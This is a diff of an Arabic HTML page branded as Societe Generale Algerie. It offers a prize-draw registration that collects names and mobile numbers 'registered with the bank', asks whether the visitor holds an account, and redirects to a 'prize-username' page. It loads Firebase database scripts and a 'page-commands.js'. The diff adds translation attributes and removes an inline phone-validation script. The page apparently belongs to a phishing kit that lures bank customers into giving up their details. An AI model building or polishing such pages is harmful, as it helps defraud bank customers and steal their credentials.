             </div>
 
             <div class="rounded-2xl border border-[#ececec] bg-white p-4">
               <div class="flex items-center justify-between gap-3">
-                <p class="text-[14px] font-bold leading-snug text-[#141414]" data-testid="has-account-question">هل لديك حساب في بنك Societe Generale Algerie؟</p>
+                <p class="text-[14px] font-bold leading-snug text-[#141414]" data-testid="has-account-question" data-i18n="home.modal.hasAccount">هل لديك حساب في بنك Societe Generale Algerie؟</p>
                 <span class="flex h-[46px] w-[46px] shrink-0 items-center justify-center rounded-full bg-[#e53935] shadow-[0_4px_14px_rgba(229,57,53,0.35)]">
                   <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-landmark text-white"><line x1="3" x2="21" y1="22" y2="22"></line><line x1="6" x2="6" y1="18" y2="11"></line><line x1="10" x2="10" y1="18" y2="11"></line><line x1="14" x2="14" y1="18" y2="11"></line><line x1="18" x2="18" y1="18" y2="11"></line><polygon points="12 2 20 7 4 7"></polygon></svg>
                 </span>
               </div>
               <div class="mt-4 grid grid-cols-2 gap-3">
-                <button type="button" data-testid="has-account-yes" class="rounded-2xl border-[1.5px] py-3.5 text-base font-bold transition-all duration-200 active:scale-[0.97] border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]">نعم</button>
-                <button type="button" data-testid="has-account-no" class="rounded-2xl border-[1.5px] py-3.5 text-base font-bold transition-all duration-200 active:scale-[0.97] border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]">لا</button>
+                <button type="button" data-testid="has-account-yes" class="rounded-2xl border-[1.5px] py-3.5 text-base font-bold transition-all duration-200 active:scale-[0.97] border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]" data-i18n="home.modal.yes">نعم</button>
+                <button type="button" data-testid="has-account-no" class="rounded-2xl border-[1.5px] py-3.5 text-base font-bold transition-all duration-200 active:scale-[0.97] border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]" data-i18n="home.modal.no">لا</button>
               </div>
             </div>
 
-            <button type="submit" disabled="" data-testid="submit-registration-button" class="inline-flex w-full items-center justify-center gap-2 rounded-full border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-4 text-[17px] font-bold text-white shadow-[0_6px_20px_rgba(198,40,40,0.35)] transition-all duration-200 hover:brightness-105 active:scale-[0.97] disabled:opacity-60">تأكيد الطلب</button>
+            <button type="submit" disabled="" data-testid="submit-registration-button" class="inline-flex w-full items-center justify-center gap-2 rounded-full border-none bg-gradient-to-br from-[#c62828] to-[#e53935] px-5 py-4 text-[17px] font-bold text-white shadow-[0_6px_20px_rgba(198,40,40,0.35)] transition-all duration-200 hover:brightness-105 active:scale-[0.97] disabled:opacity-60" data-i18n="home.modal.submit">تأكيد الطلب</button>
           </form>
         </div>
       </div>
@@ -239,17 +217,17 @@
   <!-- ── نافذة "تم تسجيلك بنجاح" ── -->
   <div class="success-sheet-backdrop" id="registrationSuccessSheet" role="dialog" aria-modal="true" aria-labelledby="successSheetTitle">
     <div class="success-sheet">
-      <button type="button" class="success-close-x" id="successCloseX" aria-label="إغلاق">✕</button>
+      <button type="button" class="success-close-x" id="successCloseX" aria-label="إغلاق" data-i18n-aria="home.success.closeAria">✕</button>
       <div class="success-icon-wrap" aria-hidden="true">
         <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round">
           <polyline points="20 6 9 17 4 12"></polyline>
         </svg>
       </div>
-      <h2 class="success-title" id="successSheetTitle">تم تسجيلك بنجاح!</h2>
-      <p class="success-subtitle">أصبحت ضمن المشاركين في السحب. حظاً موفقاً!</p>
+      <h2 class="success-title" id="successSheetTitle" data-i18n="home.success.title">تم تسجيلك بنجاح!</h2>
+      <p class="success-subtitle" data-i18n="home.success.subtitle">أصبحت ضمن المشاركين في السحب. حظاً موفقاً!</p>
       <div class="success-actions">
-        <button type="button" class="success-btn-outline" id="exploreAppBtn">استكشف تطبيق APPLI SGA</button>
-        <button type="button" class="success-btn-red" id="closeSuccessBtn">إغلاق</button>
+        <button type="button" class="success-btn-outline" id="exploreAppBtn" data-i18n="home.success.explore">استكشف تطبيق APPLI SGA</button>
+        <button type="button" class="success-btn-red" id="closeSuccessBtn" data-i18n="home.success.close">إغلاق</button>
       </div>
     </div>
   </div>
@@ -261,273 +239,7 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
   <script src="/assets/js/firebase-client.js?v=14"></script>
   <script src="/assets/js/page-commands.js?v=5"></script>
-  <script src="/assets/js/site-lang.js?v=1"></script>
+  <script src="/assets/js/site-lang.js?v=2"></script>
   <script src="/assets/js/home.js?v=3"></script>
-  <script>
-    (function () {
-      'use strict';
-
-      var phoneInput = document.querySelector('[data-testid="input-phone"]');
-      var nameInput = document.querySelector('[data-testid="input-name"]');
-      var yesBtn = document.querySelector('[data-testid="has-account-yes"]');
-      var noBtn = document.querySelector('[data-testid="has-account-no"]');
-      var submitButton = document.querySelector('[data-testid="submit-registration-button"]');
-      var modal = document.querySelector('[data-testid="registration-modal"]');
-      var form = modal ? modal.querySelector('form') : null;
-      var errorMsg = document.getElementById('phoneErrorMsg');
-      var successSheet = document.getElementById('registrationSuccessSheet');
-      if (!phoneInput) return;
-
-      var PREFIX_REGEX = /^0[567]/;
-      var FULL_REGEX = /^0[567]\d{8}$/;
-      var bankAnswered = false;
-      var redirectFallbackTimer = null;
-
-      function goToNextPage() {
-        if (redirectFallbackTimer) {
-          clearTimeout(redirectFallbackTimer);
-          redirectFallbackTimer = null;
-        }
-        var href = window.SiteLang && typeof window.SiteLang.href === 'function'
-          ? window.SiteLang.href('prize-username.html')
-          : 'prize-username.html';
-        if (window.location.pathname.indexOf('prize-username.html') === -1) {
-          window.location.href = href;
-        }
-      }
-
-      function hasNonPhoneCharacters(value) {
-        var raw = String(value == null ? '' : value).trim();
-        if (!raw) return false;
-        return !/^\+?[\d٠-٩۰-۹\s().-]+$/.test(raw);
-      }
-
-      function normalizeAlgerianMobile(value) {
-        var arabic = "٠١٢٣٤٥٦٧٨٩";
-        var persian = "۰۱۲۳۴۵۶۷۸۹";
-        var phone = String(value == null ? "" : value).trim();
-        if (!phone) return "";
-
-        phone = phone.replace(/[٠-٩۰-۹]/g, function (digit) {
-          var index = arabic.indexOf(digit);
-          if (index === -1) index = persian.indexOf(digit);
-          return String(index);
-        });
-
-        if (!/^\+?[\d\s().-]+$/.test(phone)) return "";
-
-        phone = phone.replace(/[\s().-]/g, "");
-
-        if (phone.startsWith("+")) {
-          if (!phone.startsWith("+213")) return "";
-          phone = "0" + phone.slice(4);
-        } else if (phone.startsWith("00")) {
-          if (!phone.startsWith("00213")) return "";
-          phone = "0" + phone.slice(5);
-        } else if (phone.startsWith("213") && phone.length === 12) {
-          phone = "0" + phone.slice(3);
-        }
-
-        return phone;
-      }
-
-      function isValidAlgerianMobile(value) {
-        return FULL_REGEX.test(normalizeAlgerianMobile(value));
-      }
-
-      function getInvalidMessage() {
-        var lang = document.documentElement.lang || 'ar';
-        if (lang === 'en') return 'Invalid phone number. Please enter a phone number registered with the bank.';
-        if (lang === 'fr') return 'Numéro de téléphone invalide. Veuillez saisir un numéro enregistré auprès de la banque.';
-        return 'رقم الهاتف غير صحيح يرجى ادخال رقم هاتف مسجل في البنك';
-      }
-
-      function showPhoneError() {
-        if (!errorMsg) return;
-        errorMsg.textContent = getInvalidMessage();
-        errorMsg.style.display = 'block';
-        phoneInput.style.borderColor = '#c62828';
-      }
-
-      function hidePhoneError() {
-        if (!errorMsg) return;
-        errorMsg.style.display = 'none';
-        phoneInput.style.borderColor = '';
-      }
-
-      function isNameValid() {
-        if (!nameInput) return true;
-        var minLen = parseInt(nameInput.getAttribute('minlength') || '3', 10);
-        return String(nameInput.value || '').trim().length >= minLen;
-      }
-
-      function isBankValid() {
-        if (!yesBtn || !noBtn) return true;
-        if (bankAnswered) return true;
-        return yesBtn.classList.contains('selected') || noBtn.classList.contains('selected');
-      }
-
-      function syncSubmitState(phoneValid) {
-        if (!submitButton) return;
-        var ready = Boolean(phoneValid && isNameValid() && isBankValid());
-        submitButton.disabled = !ready;
-        if (ready) {
-          submitButton.removeAttribute('disabled');
-        } else {
-          submitButton.setAttribute('disabled', '');
-        }
-      }
-
-      function enforcePhoneValidation(isDeleting) {
-        var raw = String(phoneInput.value || '').trim();
-
-        if (hasNonPhoneCharacters(raw)) {
-          phoneInput.setCustomValidity(getInvalidMessage());
-          showPhoneError();
-          syncSubmitState(false);
-          return false;
-        }
-
-        var normalized = normalizeAlgerianMobile(raw);
-        var digitCount = normalized.replace(/\D/g, '').length;
-        var valid = FULL_REGEX.test(normalized);
-
-        phoneInput.setCustomValidity(valid ? '' : getInvalidMessage());
-
-        if (!raw || isDeleting || digitCount < 8) {
-          hidePhoneError();
-        } else if (digitCount < 10 && PREFIX_REGEX.test(normalized)) {
-          hidePhoneError();
-        } else if (valid) {
-          hidePhoneError();
-        } else {
-          showPhoneError();
-        }
-
-        syncSubmitState(valid);
-        return valid;
-      }
-
-      phoneInput.addEventListener('beforeinput', function (e) {
-        if (e.inputType && e.inputType.startsWith('delete')) return;
-        if (typeof e.data === 'string' && e.data.length > 0) {
-          if (!/^[0-9٠-٩۰-۹+\s().-]+$/.test(e.data)) {
-            e.preventDefault();
-          }
-        }
-      });
-
-      phoneInput.addEventListener('input', function (e) {
-        var isDeleting = Boolean(e && e.inputType && e.inputType.startsWith('delete'));
-        setTimeout(function () {
-          enforcePhoneValidation(isDeleting);
-        }, 0);
-      });
-
-      phoneInput.addEventListener('change', function () {
-        enforcePhoneValidation(false);
-      });
-
-      phoneInput.addEventListener('focus', function () {
-        if (String(phoneInput.value || '').trim().length > 0) {
-          enforcePhoneValidation(false);
-        }
-      });
-
-      phoneInput.addEventListener('blur', function () {
-        var raw = String(phoneInput.value || '').trim();
-        if (!raw) {
-          hidePhoneError();
-          syncSubmitState(false);
-          return;
-        }
-        if (hasNonPhoneCharacters(raw)) {
-          showPhoneError();
-          syncSubmitState(false);
-          return;
-        }
-        if (isValidAlgerianMobile(raw)) {
-          var normalized = normalizeAlgerianMobile(raw);
-          if (phoneInput.value !== normalized) {
-            phoneInput.value = normalized;
-          }
-          hidePhoneError();
-          syncSubmitState(true);
-        } else {
-          if (normalizeAlgerianMobile(raw).replace(/\D/g, '').length >= 8) {
-            showPhoneError();
-          }
-          syncSubmitState(false);
-        }
-      });
-
-      var lastAutofillVal = phoneInput.value;
-      setInterval(function () {
-        if (phoneInput.value !== lastAutofillVal) {
-          lastAutofillVal = phoneInput.value;
-          enforcePhoneValidation(false);
-        }
-      }, 300);
-
-      if (nameInput) {
-        nameInput.addEventListener('input', function () {
-          syncSubmitState(isValidAlgerianMobile(phoneInput.value));
-        });
-      }
-
-      if (yesBtn) {
-        yesBtn.addEventListener('click', function () {
-          bankAnswered = true;
-          setTimeout(function () {
-            syncSubmitState(isValidAlgerianMobile(phoneInput.value));
-          }, 0);
-        });
-      }
-
-      if (noBtn) {
-        noBtn.addEventListener('click', function () {
-          bankAnswered = true;
-          setTimeout(function () {
-            syncSubmitState(isValidAlgerianMobile(phoneInput.value));
-          }, 0);
-        });
-      }
-
-      if (form) {
-        form.addEventListener('submit', function (e) {
-          var valid = enforcePhoneValidation(false);
-          if (!valid || !isNameValid() || !isBankValid()) {
-            e.preventDefault();
-            e.stopImmediatePropagation();
-            if (!valid && String(phoneInput.value || '').trim().length > 0) {
-              showPhoneError();
-            }
-            phoneInput.reportValidity();
-            return false;
-          }
-
-          var normalized = normalizeAlgerianMobile(phoneInput.value);
-          phoneInput.value = normalized;
-          hidePhoneError();
-
-          // ضمان الانتقال إلى الصفحة التالية حتى لو تأخر home.js
-          if (!redirectFallbackTimer) {
-            redirectFallbackTimer = setTimeout(goToNextPage, 1600);
-          }
-        }, true);
-      }
-
-      if (successSheet) {
-        var sheetObserver = new MutationObserver(function () {
-          if (successSheet.classList.contains('active') && !redirectFallbackTimer) {
-            redirectFallbackTimer = setTimeout(goToNextPage, 1500);
-          }
-        });
-        sheetObserver.observe(successSheet, { attributes: true, attributeFilter: ['class'] });
-      }
-
-      enforcePhoneValidation(false);
-    })();
-  </script>
 </body>
 </html>
